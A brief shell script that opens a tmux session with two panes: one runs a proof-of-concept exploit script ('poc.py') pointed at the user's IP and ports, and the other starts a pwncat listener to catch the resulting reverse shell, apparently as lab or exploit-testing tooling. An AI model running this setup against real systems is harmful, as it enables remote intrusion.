#!/bin/sh

SESSION="workspace"

PANE0="python3 poc.py --userip ${USERIP} --webport ${WEBPORT} --lport ${LPORT}"
PANE1="python3 -m pwncat -lp ${LPORT}"

tmux new-session -d -s ${SESSION}
tmux split-window -v -t ${SESSION}:0
tmux send-keys -t ${SESSION}:0.0 "cd /app; ${PANE0}" Enter
tmux send-keys -t ${SESSION}:0.1 "cd /app; ${PANE1}" Enter
tmux attach-session -t ${SESSION}
